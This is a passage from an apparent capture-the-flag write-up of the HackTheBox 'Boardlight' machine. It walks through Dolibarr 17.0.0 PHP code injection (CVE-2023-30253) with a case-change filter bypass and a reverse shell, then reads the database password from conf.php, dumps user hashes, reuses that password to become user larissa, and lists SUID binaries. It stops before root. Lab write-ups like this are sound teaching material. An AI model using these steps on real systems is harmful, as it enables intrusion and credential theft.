 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 15949
________________________________________________

crm                     [Status: 200, Size: 6360, Words: 397, Lines: 150, Duration: 375ms]
:: Progress: [114441/114441] :: Job [1/1] :: 108 req/sec :: Duration: [0:18:23] :: Errors: 0 ::
</code></pre>

<p>I can see the crm.board.htb subdomain, which I will add to the /etc/hosts. Inspecting it with curl, I can see it consists on a dolibarr 17.0.0 instance:</p>

<pre><code class="language-bash">❯ curl -s crm.board.htb | less
</code></pre>

<p><img src="/assets/images/Boardlight/Pasted%20image%2020240928095124.png" alt="" /></p>

<p>And in the browser looks like this:</p>

<p><img src="/assets/images/Boardlight/Pasted%20image%2020240928095305.png" alt="" /></p>

<p>Searching for what dolibarr is, I can see it’s a web-based ERP and CRM software:</p>

<p><img src="/assets/images/Boardlight/Pasted%20image%2020240928095512.png" alt="" /></p>

<p>ERP is a software which allows to manage financial staff in a business:</p>

<p><img src="/assets/images/Boardlight/Pasted%20image%2020240928095733.png" alt="" /></p>

<p>And a CRM is a software that lets store customer information, identify sales opportunities, etc:</p>

<p><img src="/assets/images/Boardlight/Pasted%20image%2020240928095749.png" alt="" /></p>
    
      <h1 id="access-as-www-data">
        
        
          Access as www-data <a href="#access-as-www-data" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
        
        
      </h1>

<p>Looking for vulnerabilities of dolibarr 17.0.0, I can see <a href="https://www.swascan.com/security-advisory-dolibarr-17-0-0/">this article</a> that talks about exploiting CVE-2023-30253, a PHP code injection vulnerability:</p>

<p><img src="/assets/images/Boardlight/Pasted%20image%2020240928100100.png" alt="" /></p>

<p>But it requires authentication:</p>

<p><img src="/assets/images/Boardlight/Pasted%20image%2020240928100327.png" alt="" /></p>

<p>However, trying admin:admin does work:</p>

<p><img src="/assets/images/Boardlight/Pasted%20image%2020240928100506.png" alt="" /></p>

<p>I will add a website like the PoC says:</p>

<p><img src="/assets/images/Boardlight/Pasted%20image%2020240928100617.png" alt="" /></p>

<p>And add a page in that created website:</p>

<p><img src="/assets/images/Boardlight/Pasted%20image%2020240928101155.png" alt="" /></p>

<p>Then, I will click on “Edit HTML Source” and try to add php code that executes the whoami command:</p>

<p><img src="/assets/images/Boardlight/Pasted%20image%2020240928100909.png" alt="" /></p>

<p>But it says that the system function is disabled (as shown in the PoC):</p>

<p><img src="/assets/images/Boardlight/Pasted%20image%2020240928101304.png" alt="" /></p>

<p>The PoC says it can be bypassed by putting some letter of <code>&lt;?php</code> in uppercase because the filters of dolibarr code doesn’t check the case:</p>

<p><img src="/assets/images/Boardlight/Pasted%20image%2020240928101511.png" alt="" /></p>

<p>So I will put <code>&lt;?PHP</code> instead of <code>&lt;?php</code> and see what happens:</p>

<p><img src="/assets/images/Boardlight/Pasted%20image%2020240928101650.png" alt="" /></p>

<p>Now clicking on “Show dynamic content”, I can see the results of <code>whoami</code> command:</p>

<p><img src="/assets/images/Boardlight/Pasted%20image%2020240928101733.png" alt="" /></p>

<p>But instead of executing whoami, I want to get access to the system, so I will start a nc listener and put a command to receive a reverse shell there:</p>

<p><img src="/assets/images/Boardlight/Pasted%20image%2020240928101944.png" alt="" /></p>

<p>And I receive a shell as www-data in the host machine:</p>

<p><img src="/assets/images/Boardlight/Pasted%20image%2020240928102011.png" alt="" /></p>

<p>Now, I will do a tty treatment to have a more stabilized shell, do ctrl+c, ctrl+l, etc:</p>

<pre><code class="language-bash">www-data@boardlight:~/html/crm.board.htb/htdocs/website$ script /dev/null -c bash
&lt;.board.htb/htdocs/website$ script /dev/null -c bash     
Script started, file is /dev/null
www-data@boardlight:~/html/crm.board.htb/htdocs/website$ ^Z
[1]  + 30548 suspended  nc -lvnp 443
❯ stty raw -echo; fg
[1]  + 30548 continued  nc -lvnp 443
                                    reset xterm
www-data@boardlight:~/html/crm.board.htb/htdocs/website$ export TERM=xterm
www-data@boardlight:~/html/crm.board.htb/htdocs/website$ export SHELL=bash
www-data@boardlight:~/html/crm.board.htb/htdocs/website$ stty rows 50 cols 184
</code></pre>

<ul>
  <li><code>script /dev/null -c bash</code>: Spawns a tty.</li>
  <li><code>ctrl+z</code>: puts the shell in background for later doing a treatment.</li>
  <li><code>stty raw -echo;fg</code>: gives the shell back again.</li>
  <li><code>reset xterm</code>: resets the terminal to give the bash console.</li>
  <li><code>export TERM=xterm</code>: lets do ctrl+l to clean the terminal.</li>
  <li><code>export SHELL=bash</code>: specifies the system that it’s using a bash console.</li>
  <li><code>stty rows &lt;YOUR ROWS&gt; cols &lt;YOUR COLUMNS&gt;</code>: sets the size of the current full terminal window. It is possible to view the right size for your window running <code>stty size</code> in a entire new window on your terminal.</li>
</ul>
    
      <h1 id="access-as-larissa">
        
        
          Access as larissa <a href="#access-as-larissa" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
        
        
      </h1>

<p>Looking for php configuration files, I can see that the user.class.php uses some sql queries to execute:</p>

<pre><code class="language-bash">www-data@boardlight:~/html/crm.board.htb/htdocs$ cat user/class/user.class.php | grep -i SELECT
		$sql = "SELECT u.rowid, u.lastname, u.firstname, u.employee, u.gender, u.civility as civility_code, u.birth, u.email, u.personal_email, u.job,";
			$sql = "SELECT param, value FROM ".$this-&gt;db-&gt;prefix()."user_param";
			$sql = "SELECT module, perms, subperms";
			$sql = "SELECT id";
			$sql = "SELECT module, perms, subperms";
			$sql = "SELECT id";
		$sql = "SELECT DISTINCT r.module, r.perms, r.subperms";
		$sql = "SELECT DISTINCT r.module, r.perms, r.subperms";
			$sqltochecklogin = "SELECT COUNT(*) as nb FROM ".$this-&gt;db-&gt;prefix()."user WHERE entity IN (".$this-&gt;db-&gt;sanitize((int) $this-&gt;entity).", 0) AND login = '".$this-&gt;db-&gt;escape($this-&gt;login)."'";
			$sqltochecklogin = "SELECT COUNT(*) as nb FROM ".$this-&gt;db-&gt;prefix()."user WHERE entity IN (".$this-&gt;db-&gt;sanitize((int) $this-&gt;entity).", 0) AND email = '".$this-&gt;db-&gt;escape($this-&gt;email)."'";
		$sql = "SELECT id FROM ".$this-&gt;db-&gt;prefix()."rights_def";
			$sqltochecklogin = "SELECT COUNT(*) as nb FROM ".$this-&gt;db-&gt;prefix()."user WHERE entity IN (".$this-&gt;db-&gt;sanitize((int) $this-&gt;entity).", 0) AND login = '".$this-&gt;db-&gt;escape($this-&gt;login)."'";
			$sqltochecklogin = "SELECT COUNT(*) as nb FROM ".$this-&gt;db-&gt;prefix()."user WHERE entity IN (".$this-&gt;db-&gt;sanitize((int) $this-&gt;entity).", 0) AND email = '".$this-&gt;db-&gt;escape($this-&gt;email)."'";
		$sql = "SELECT url, login, pass, poste ";
					$info[$conf-&gt;global-&gt;LDAP_FIELD_GROUPID] = $groupforuser-&gt;id; //Select first group in list
		$sql = "SELECT u.rowid, u.login as ref, u.datec,";
		$sql = "SELECT count(mc.email) as nb";
		$sql = "SELECT count(rowid) as nb";
		$sql = "SELECT rowid FROM ".$this-&gt;db-&gt;prefix()."user";
		$sql = "SELECT fk_user as id_parent, rowid as id_son";
		$sql = "SELECT DISTINCT u.rowid, u.firstname, u.lastname, u.fk_user, u.fk_soc, u.login, u.email, u.gender, u.admin, u.statut, u.photo, u.entity"; // Distinct reduce pb with old tables with duplicates
		$sql = "SELECT COUNT(DISTINCT u.rowid) as nb";
		$sql = "SELECT rowid, email, user_mobile, civility, lastname, firstname";
		$sql = "SELECT t.rowid";
		$sql = 'SELECT rowid';
</code></pre>

<p>But some credentials are needed to use sql so where are saved? In that script, I can see that to execute a query is using the function query of the class db of the current object:</p>

<pre><code class="language-php">	public function findUserIdByEmail($email)
	{
		if (isset($this-&gt;findUserIdByEmailCache[$email])) {
			return $this-&gt;findUserIdByEmailCache[$email];
		}

		$this-&gt;findUserIdByEmailCache[$email] = -1;

		global $conf;

		$sql = 'SELECT rowid';
		$sql .= ' FROM '.$this-&gt;db-&gt;prefix().'user';
		if (!empty($conf-&gt;global-&gt;AGENDA_DISABLE_EXACT_USER_EMAIL_COMPARE_FOR_EXTERNAL_CALENDAR)) {
			$sql .= " WHERE email LIKE '%".$this-&gt;db-&gt;escape($email)."%'";
		} else {
			$sql .= " WHERE email = '".$this-&gt;db-&gt;escape($email)."'";
		}
		$sql .= ' LIMIT 1';

		$resql = $this-&gt;db-&gt;query($sql);
		if (!$resql) {
			return -1;
		}

		$obj = $this-&gt;db-&gt;fetch_object($resql);
		if (!$obj) {
			return -1;
		}

		$this-&gt;findUserIdByEmailCache[$email] = (int) $obj-&gt;rowid;

		return $this-&gt;findUserIdByEmailCache[$email];
	}
</code></pre>

<p>Searching recursively for that variable in php script, I can see it uses the ‘$conf’ variable for the user, password, etc:</p>

<pre><code class="language-bash">www-data@boardlight:~/html/crm.board.htb/htdocs$ grep '$db' -r *.php
</code></pre>

<p><img src="/assets/images/Boardlight/Pasted%20image%2020240928103502.png" alt="" /></p>

<p>The <code>$conf</code> variable takes the parameters from variables like <code>$dolibarr_main_db_user</code> and <code>$dolibarr_main_db_pass</code> that are taked from some php file:</p>

<pre><code class="language-php">require_once DOL_DOCUMENT_ROOT.'/core/class/conf.class.php';

$conf = new Conf();

// Set properties specific to database
$conf-&gt;db-&gt;host = empty($dolibarr_main_db_host) ? '' : $dolibarr_main_db_host;
$conf-&gt;db-&gt;port = empty($dolibarr_main_db_port) ? '' : $dolibarr_main_db_port;
$conf-&gt;db-&gt;name = empty($dolibarr_main_db_name) ? '' : $dolibarr_main_db_name;
$conf-&gt;db-&gt;user = empty($dolibarr_main_db_user) ? '' : $dolibarr_main_db_user;
$conf-&gt;db-&gt;pass = empty($dolibarr_main_db_pass) ? '' : $dolibarr_main_db_pass;
$conf-&gt;db-&gt;type = $dolibarr_main_db_type;
$conf-&gt;db-&gt;prefix = $dolibarr_main_db_prefix;
$conf-&gt;db-&gt;character_set = $dolibarr_main_db_character_set;
$conf-&gt;db-&gt;dolibarr_main_db_collation = $dolibarr_main_db_collation;
$conf-&gt;db-&gt;dolibarr_main_db_encryption = $dolibarr_main_db_encryption;
$conf-&gt;db-&gt;dolibarr_main_db_cryptkey = $dolibarr_main_db_cryptkey;
if (defined('TEST_DB_FORCE_TYPE')) {
	$conf-&gt;db-&gt;type = constant('TEST_DB_FORCE_TYPE'); // Force db type (for test purpose, by PHP unit for example)
}
</code></pre>

<p>And I can see they are stored in the conf/conf.php file:</p>

<pre><code class="language-bash">www-data@boardlight:~/html/crm.board.htb/htdocs$ cat conf/conf.php | grep 'dolibarr_main_db'
$dolibarr_main_db_host='localhost';
$dolibarr_main_db_port='3306';
$dolibarr_main_db_name='dolibarr';
$dolibarr_main_db_prefix='llx_';
$dolibarr_main_db_user='dolibarrowner';
$dolibarr_main_db_pass='serverfun2$2023!!';
$dolibarr_main_db_type='mysqli';
$dolibarr_main_db_character_set='utf8';
$dolibarr_main_db_collation='utf8_unicode_ci';
</code></pre>

<p>However, the only user stored in the dolibarr database that is interesting is dolibarr (because I already know that the password of admin is admin):</p>

<pre><code class="language-bash">www-data@boardlight:~/html/crm.board.htb/htdocs$ mysql -udolibarrowner -p'serverfun2$2023!!'
mysql: [Warning] Using a password on the command line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 197
Server version: 8.0.36-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2024, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql&gt; show databases;
+--------------------+
| Database           |
+--------------------+
| dolibarr           |
| information_schema |
| performance_schema |
+--------------------+
3 rows in set (0.00 sec)

mysql&gt; use dolibarr;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql&gt; show tables;
+-------------------------------------------------------------+
| Tables_in_dolibarr                                          |
+-------------------------------------------------------------+
| llx_accounting_account                                      |
| llx_accounting_bookkeeping                                  |
| llx_accounting_bookkeeping_tmp                              |
| llx_accounting_fiscalyear                                   |
| llx_accounting_groups_account                               |
| llx_accounting_journal                                      |
| llx_accounting_system                                       |
| llx_actioncomm                                              |
| llx_actioncomm_extrafields                                  |
| llx_actioncomm_reminder                                     |
| llx_actioncomm_resources                                    |
| llx_adherent                                                |
| llx_adherent_extrafields                                    |
| llx_adherent_type                                           |
| llx_adherent_type_extrafields                               |
| llx_adherent_type_lang                                      |
| llx_bank                                                    |
| llx_bank_account                                            |
| llx_bank_account_extrafields                                |
| llx_bank_categ                                              |
| llx_bank_class                                              |
| llx_bank_extrafields                                        |
| llx_bank_url                                                |
| llx_blockedlog                                              |
| llx_blockedlog_authority                                    |
| llx_bom_bom                                                 |
| llx_bom_bom_extrafields                                     |
| llx_bom_bomline                                             |
| llx_bom_bomline_extrafields                                 |
| llx_bookmark                                                |
| llx_bordereau_cheque                                        |
| llx_boxes                                                   |
| llx_boxes_def                                               |
| llx_budget                                                  |
| llx_budget_lines                                            |
| llx_c_accounting_category                                   |
| llx_c_action_trigger                                        |
| llx_c_actioncomm                                            |
| llx_c_availability                                          |
| llx_c_barcode_type                                          |
| llx_c_chargesociales                                        |
| llx_c_civility                                              |
| llx_c_country                                               |
| llx_c_currencies                                            |
| llx_c_departements                                          |
| llx_c_ecotaxe                                               |
| llx_c_effectif                                              |
| llx_c_email_senderprofile                                   |
| llx_c_email_templates                                       |
| llx_c_exp_tax_cat                                           |
| llx_c_exp_tax_range                                         |
| llx_c_field_list                                            |
| llx_c_format_cards                                          |
| llx_c_forme_juridique                                       |
| llx_c_holiday_types                                         |
| llx_c_hrm_department                                        |
| llx_c_hrm_function                                          |
| llx_c_hrm_public_holiday                                    |
| llx_c_incoterms                                             |
| llx_c_input_method                                          |
| llx_c_input_reason                                          |
| llx_c_lead_status                                           |
| llx_c_paiement                                              |
| llx_c_paper_format                                          |
| llx_c_payment_term                                          |
| llx_c_price_expression                                      |
| llx_c_price_global_variable                                 |
| llx_c_price_global_variable_updater                         |
| llx_c_product_nature                                        |
| llx_c_productbatch_qcstatus                                 |
| llx_c_propalst                                              |
| llx_c_prospectcontactlevel                                  |
| llx_c_prospectlevel                                         |
| llx_c_recruitment_origin                                    |
| llx_c_regions                                               |
| llx_c_revenuestamp                                          |
| llx_c_shipment_mode                                         |
| llx_c_shipment_package_type                                 |
| llx_c_socialnetworks                                        |
| llx_c_stcomm                                                |
| llx_c_stcommcontact                                         |
| llx_c_ticket_category                                       |
| llx_c_ticket_resolution                                     |
| llx_c_ticket_severity                                       |
| llx_c_ticket_type                                           |
| llx_c_transport_mode                                        |
| llx_c_tva                                                   |
| llx_c_type_contact                                          |
| llx_c_type_container                                        |
| llx_c_type_fees                                             |
| llx_c_type_resource                                         |
| llx_c_typent                                                |
| llx_c_units                                                 |
| llx_c_ziptown                                               |
| llx_categorie                                               |
| llx_categorie_account                                       |
| llx_categorie_actioncomm                                    |
| llx_categorie_contact                                       |
| llx_categorie_fournisseur                                   |
| llx_categorie_lang                                          |
| llx_categorie_member                                        |
| llx_categorie_product                                       |
| llx_categorie_project                                       |
| llx_categorie_societe                                       |
| llx_categorie_user                                          |
| llx_categorie_warehouse                                     |
| llx_categorie_website_page                                  |
| llx_categories_extrafields                                  |
| llx_chargesociales                                          |
| llx_commande                                                |
| llx_commande_extrafields                                    |
| llx_commande_fournisseur                                    |
| llx_commande_fournisseur_dispatch                           |
| llx_commande_fournisseur_dispatch_extrafields               |
| llx_commande_fournisseur_extrafields                        |
| llx_commande_fournisseur_log                                |
| llx_commande_fournisseurdet                                 |
| llx_commande_fournisseurdet_extrafields                     |
| llx_commandedet                                             |
| llx_commandedet_extrafields                                 |
| llx_comment                                                 |
| llx_const                                                   |
| llx_contrat                                                 |
| llx_contrat_extrafields                                     |
| llx_contratdet                                              |
| llx_contratdet_extrafields                                  |
| llx_contratdet_log                                          |
| llx_cronjob                                                 |
| llx_default_values                                          |
| llx_delivery                                                |
| llx_delivery_extrafields                                    |
| llx_deliverydet                                             |
| llx_deliverydet_extrafields                                 |
| llx_document_model                                          |
| llx_ecm_directories                                         |
| llx_ecm_directories_extrafields                             |
| llx_ecm_files                                               |
| llx_ecm_files_extrafields                                   |
| llx_element_categorie                                       |
| llx_element_contact                                         |
| llx_element_element                                         |
| llx_element_resources                                       |
| llx_emailcollector_emailcollector                           |
| llx_emailcollector_emailcollectoraction                     |
| llx_emailcollector_emailcollectorfilter                     |
| llx_entrepot                                                |
| llx_entrepot_extrafields                                    |
| llx_establishment                                           |
| llx_event_element                                           |
| llx_eventorganization_conferenceorboothattendee             |
| llx_eventorganization_conferenceorboothattendee_extrafields |
| llx_events                                                  |
| llx_expedition                                              |
| llx_expedition_extrafields                                  |
| llx_expedition_package                                      |
| llx_expeditiondet                                           |
| llx_expeditiondet_batch                                     |
| llx_expeditiondet_extrafields                               |
| llx_expensereport                                           |
| llx_expensereport_det                                       |
| llx_expensereport_extrafields                               |
| llx_expensereport_ik                                        |
| llx_expensereport_rules                                     |
| llx_export_compta                                           |
| llx_export_model                                            |
| llx_extrafields                                             |
| llx_facture                                                 |
| llx_facture_extrafields                                     |
| llx_facture_fourn                                           |
| llx_facture_fourn_det                                       |
| llx_facture_fourn_det_extrafields                           |
| llx_facture_fourn_det_rec                                   |
| llx_facture_fourn_det_rec_extrafields                       |
| llx_facture_fourn_extrafields                               |
| llx_facture_fourn_rec                                       |
| llx_facture_fourn_rec_extrafields                           |
| llx_facture_rec                                             |
| llx_facture_rec_extrafields                                 |
| llx_facturedet                                              |
| llx_facturedet_extrafields                                  |
| llx_facturedet_rec                                          |
| llx_facturedet_rec_extrafields                              |
| llx_fichinter                                               |
| llx_fichinter_extrafields                                   |
| llx_fichinter_rec                                           |
| llx_fichinterdet                                            |
| llx_fichinterdet_extrafields                                |
| llx_fichinterdet_rec                                        |
| llx_holiday                                                 |
| llx_holiday_config                                          |
| llx_holiday_extrafields                                     |
| llx_holiday_logs                                            |
| llx_holiday_users                                           |
| llx_import_model                                            |
| llx_inventory_extrafields                                   |
| llx_links                                                   |
| llx_localtax                                                |
| llx_mailing_unsubscribe                                     |
| llx_menu                                                    |
| llx_mrp_mo                                                  |
| llx_mrp_mo_extrafields                                      |
| llx_mrp_production                                          |
| llx_multicurrency                                           |
| llx_multicurrency_rate                                      |
| llx_notify                                                  |
| llx_notify_def                                              |
| llx_notify_def_object                                       |
| llx_oauth_state                                             |
| llx_oauth_token                                             |
| llx_object_lang                                             |
| llx_onlinesignature                                         |
| llx_overwrite_trans                                         |
| llx_paiement                                                |
| llx_paiement_facture                                        |
| llx_paiementcharge                                          |
| llx_paiementfourn                                           |
| llx_paiementfourn_facturefourn                              |
| llx_payment_donation                                        |
| llx_payment_expensereport                                   |
| llx_payment_loan                                            |
| llx_payment_salary                                          |
| llx_payment_various                                         |
| llx_payment_vat                                             |
| llx_pos_cash_fence                                          |
| llx_prelevement                                             |
| llx_prelevement_bons                                        |
| llx_prelevement_demande                                     |
| llx_prelevement_lignes                                      |
| llx_prelevement_rejet                                       |
| llx_printing                                                |
| llx_product                                                 |
| llx_product_association                                     |
| llx_product_attribute                                       |
| llx_product_attribute_combination                           |
| llx_product_attribute_combination2val                       |
| llx_product_attribute_combination_price_level               |
| llx_product_attribute_value                                 |
| llx_product_batch                                           |
| llx_product_customer_price                                  |
| llx_product_customer_price_log                              |
| llx_product_extrafields                                     |
| llx_product_fournisseur_price                               |
| llx_product_fournisseur_price_extrafields                   |
| llx_product_fournisseur_price_log                           |
| llx_product_lang                                            |
| llx_product_lot                                             |
| llx_product_lot_extrafields                                 |
| llx_product_price                                           |
| llx_product_price_by_qty                                    |
| llx_product_pricerules                                      |
| llx_product_stock                                           |
| llx_product_warehouse_properties                            |
| llx_projet                                                  |
| llx_projet_extrafields                                      |
| llx_projet_task                                             |
| llx_projet_task_extrafields                                 |
| llx_projet_task_time                                        |
| llx_propal                                                  |
| llx_propal_extrafields                                      |
| llx_propal_merge_pdf_product                                |
| llx_propaldet                                               |
| llx_propaldet_extrafields                                   |
| llx_reception                                               |
| llx_reception_extrafields                                   |
| llx_resource                                                |
| llx_resource_extrafields                                    |
| llx_rights_def                                              |
| llx_salary                                                  |
| llx_salary_extrafields                                      |
| llx_session                                                 |
| llx_societe                                                 |
| llx_societe_account                                         |
| llx_societe_address                                         |
| llx_societe_commerciaux                                     |
| llx_societe_contacts                                        |
| llx_societe_extrafields                                     |
| llx_societe_prices                                          |
| llx_societe_remise                                          |
| llx_societe_remise_except                                   |
| llx_societe_remise_supplier                                 |
| llx_societe_rib                                             |
| llx_socpeople                                               |
| llx_socpeople_extrafields                                   |
| llx_stock_mouvement                                         |
| llx_stock_mouvement_extrafields                             |
| llx_subscription                                            |
| llx_supplier_proposal                                       |
| llx_supplier_proposal_extrafields                           |
| llx_supplier_proposaldet                                    |
| llx_supplier_proposaldet_extrafields                        |
| llx_takepos_floor_tables                                    |
| llx_tva                                                     |
| llx_user                                                    |
| llx_user_alert                                              |
| llx_user_clicktodial                                        |
| llx_user_employment                                         |
| llx_user_extrafields                                        |
| llx_user_param                                              |
| llx_user_rib                                                |
| llx_user_rights                                             |
| llx_usergroup                                               |
| llx_usergroup_extrafields                                   |
| llx_usergroup_rights                                        |
| llx_usergroup_user                                          |
| llx_website                                                 |
| llx_website_extrafields                                     |
| llx_website_page                                            |
+-------------------------------------------------------------+
307 rows in set (0.00 sec)
</code></pre>

<pre><code class="language-bash">
mysql&gt; describe llx_user;
+------------------------------+--------------+------+-----+-------------------+-----------------------------------------------+
| Field                        | Type         | Null | Key | Default           | Extra                                         |
+------------------------------+--------------+------+-----+-------------------+-----------------------------------------------+
| rowid                        | int          | NO   | PRI | NULL              | auto_increment                                |
| entity                       | int          | NO   |     | 1                 |                                               |
| ref_employee                 | varchar(50)  | YES  |     | NULL              |                                               |
| ref_ext                      | varchar(50)  | YES  |     | NULL              |                                               |
| admin                        | smallint     | YES  |     | 0                 |                                               |
| employee                     | tinyint      | YES  |     | 1                 |                                               |
| fk_establishment             | int          | YES  |     | 0                 |                                               |
| datec                        | datetime     | YES  |     | NULL              |                                               |
| tms                          | timestamp    | YES  |     | CURRENT_TIMESTAMP | DEFAULT_GENERATED on update CURRENT_TIMESTAMP |
| fk_user_creat                | int          | YES  |     | NULL              |                                               |
| fk_user_modif                | int          | YES  |     | NULL              |                                               |
| login                        | varchar(50)  | NO   | MUL | NULL              |                                               |
| pass_encoding                | varchar(24)  | YES  |     | NULL              |                                               |
| pass                         | varchar(128) | YES  |     | NULL              |                                               |
| pass_crypted                 | varchar(128) | YES  |     | NULL              |                                               |
| pass_temp                    | varchar(128) | YES  |     | NULL              |                                               |
| api_key                      | varchar(128) | YES  | UNI | NULL              |                                               |
| gender                       | varchar(10)  | YES  |     | NULL              |                                               |
| civility                     | varchar(6)   | YES  |     | NULL              |                                               |
| lastname                     | varchar(50)  | YES  |     | NULL              |                                               |
| firstname                    | varchar(50)  | YES  |     | NULL              |                                               |
| address                      | varchar(255) | YES  |     | NULL              |                                               |
| zip                          | varchar(25)  | YES  |     | NULL              |                                               |
| town                         | varchar(50)  | YES  |     | NULL              |                                               |
| fk_state                     | int          | YES  |     | 0                 |                                               |
| fk_country                   | int          | YES  |     | 0                 |                                               |
| birth                        | date         | YES  |     | NULL              |                                               |
| birth_place                  | varchar(64)  | YES  |     | NULL              |                                               |
| job                          | varchar(128) | YES  |     | NULL              |                                               |
| office_phone                 | varchar(20)  | YES  |     | NULL              |                                               |
| office_fax                   | varchar(20)  | YES  |     | NULL              |                                               |
| user_mobile                  | varchar(20)  | YES  |     | NULL              |                                               |
| personal_mobile              | varchar(20)  | YES  |     | NULL              |                                               |
| email                        | varchar(255) | YES  |     | NULL              |                                               |
| personal_email               | varchar(255) | YES  |     | NULL              |                                               |
| signature                    | text         | YES  |     | NULL              |                                               |
| socialnetworks               | text         | YES  |     | NULL              |                                               |
| fk_soc                       | int          | YES  | MUL | NULL              |                                               |
| fk_socpeople                 | int          | YES  | UNI | NULL              |                                               |
| fk_member                    | int          | YES  | UNI | NULL              |                                               |
| fk_user                      | int          | YES  |     | NULL              |                                               |
| fk_user_expense_validator    | int          | YES  |     | NULL              |                                               |
| fk_user_holiday_validator    | int          | YES  |     | NULL              |                                               |
| idpers1                      | varchar(128) | YES  |     | NULL              |                                               |
| idpers2                      | varchar(128) | YES  |     | NULL              |                                               |
| idpers3                      | varchar(128) | YES  |     | NULL              |                                               |
| note_public                  | text         | YES  |     | NULL              |                                               |
| note_private                 | text         | YES  |     | NULL              |                                               |
| model_pdf                    | varchar(255) | YES  |     | NULL              |                                               |
| datelastlogin                | datetime     | YES  |     | NULL              |                                               |
| datepreviouslogin            | datetime     | YES  |     | NULL              |                                               |
| datelastpassvalidation       | datetime     | YES  |     | NULL              |                                               |
| datestartvalidity            | datetime     | YES  |     | NULL              |                                               |
| dateendvalidity              | datetime     | YES  |     | NULL              |                                               |
| iplastlogin                  | varchar(250) | YES  |     | NULL              |                                               |
| ippreviouslogin              | varchar(250) | YES  |     | NULL              |                                               |
| egroupware_id                | int          | YES  |     | NULL              |                                               |
| ldap_sid                     | varchar(255) | YES  |     | NULL              |                                               |
| openid                       | varchar(255) | YES  |     | NULL              |                                               |
| statut                       | tinyint      | YES  |     | 1                 |                                               |
| photo                        | varchar(255) | YES  |     | NULL              |                                               |
| lang                         | varchar(6)   | YES  |     | NULL              |                                               |
| color                        | varchar(6)   | YES  |     | NULL              |                                               |
| barcode                      | varchar(255) | YES  |     | NULL              |                                               |
| fk_barcode_type              | int          | YES  |     | 0                 |                                               |
| accountancy_code             | varchar(32)  | YES  |     | NULL              |                                               |
| nb_holiday                   | int          | YES  |     | 0                 |                                               |
| thm                          | double(24,8) | YES  |     | NULL              |                                               |
| tjm                          | double(24,8) | YES  |     | NULL              |                                               |
| salary                       | double(24,8) | YES  |     | NULL              |                                               |
| salaryextra                  | double(24,8) | YES  |     | NULL              |                                               |
| dateemployment               | date         | YES  |     | NULL              |                                               |
| dateemploymentend            | date         | YES  |     | NULL              |                                               |
| weeklyhours                  | double(16,8) | YES  |     | NULL              |                                               |
| import_key                   | varchar(14)  | YES  |     | NULL              |                                               |
| default_range                | int          | YES  |     | NULL              |                                               |
| default_c_exp_tax_cat        | int          | YES  |     | NULL              |                                               |
| national_registration_number | varchar(50)  | YES  |     | NULL              |                                               |
| fk_warehouse                 | int          | YES  |     | NULL              |                                               |
+------------------------------+--------------+------+-----+-------------------+-----------------------------------------------+
79 rows in set (0.01 sec)
</code></pre>

<pre><code class="language-bash">mysql&gt; select login,pass_crypted from llx_user;
+----------+--------------------------------------------------------------+
| login    | pass_crypted                                                 |
+----------+--------------------------------------------------------------+
| dolibarr | $2y$10$VevoimSke5Cd1/nX1Ql9Su6RstkTRe7UX1Or.cm8bZo56NjCMJzCm |
| admin    | $2y$10$gIEKOl7VZnr5KLbBDzGbL.YuJxwz5Sdl5ji3SEuiUSlULgAhhjH96 |
+----------+--------------------------------------------------------------+
2 rows in set (0.00 sec)
</code></pre>

<p>But the hash of <code>dolibarr</code> user doesn’t seem crackable.</p>

<p>There’s also a <code>larissa</code> user in the <code>home</code> folder:</p>

<pre><code class="language-bash">www-data@boardlight:~/html/crm.board.htb/htdocs$ cd /home/
www-data@boardlight:/home$ ls
larissa
</code></pre>

<p>And trying the password used in the database for larissa user of the system does work (because it’s reused):</p>

<pre><code class="language-bash">www-data@boardlight:/home$ su larissa
Password: serverfun2$2023!!
larissa@boardlight:/home$
</code></pre>

<p>The user.txt flag is available in larissa’s home directory:</p>

<pre><code class="language-bash">larissa@boardlight:/home$ cd larissa/
larissa@boardlight:~$ ls
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  user.txt  Videos
larissa@boardlight:~$ cat user.txt 
55****************************ea
</code></pre>
    
      <h1 id="access-as-root">
        
        
          Access as root <a href="#access-as-root" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
        
        
      </h1>

<p>Looking for executables with SUID permissions, I can see some enlightenment binaries:</p>

<pre><code class="language-bash">larissa@boardlight:~$ find / -perm -4000 2&gt;/dev/null
/usr/lib/eject/dmcrypt-get-device
/usr/lib/xorg/Xorg.wrap
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight
/usr/lib/x86_64-linux-gnu/enlightenment/modules/cpufreq/linux-gnu-x86_64-0.23.1/freqset
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/sbin/pppd
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/sudo
/usr/bin/su
/usr/bin/chfn
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/fusermount
/usr/bin/chsh
/usr/bin/vmware-user-suid-wrapper
</code></pre>

<p>Enlightenment is a custom window manager:</p>

<p><img src="/assets/images/Boardlight/Pasted%20image%2020240928105923.png" alt="" /></p>

<p>Looking for its version, I can see it’s 0.23.1:</p>

<pre><code class="language-bash">larissa@boardlight:~$ enlightenment -version
ESTART: 0.00001 [0.00001] - Begin Startup
ESTART: 0.00004 [0.00004] - Signal Trap
ESTART: 0.00005 [0.00001] - Signal Trap Done
ESTART: 0.00007 [0.00002] - Eina Init
ESTART: 0.00036 [0.00029] - Eina Init Done
ESTART: 0.00038 [0.00002] - Determine Prefix
ESTART: 0.00052 [0.00014] - Determine Prefix Done
ESTART: 0.00053 [0.00001] - Environment Variables
ESTART: 0.00054 [0.00001] - Environment Variables Done
ESTART: 0.00054 [0.00001] - Parse Arguments
Version: 0.23.1
E: Begin Shutdown Procedure!
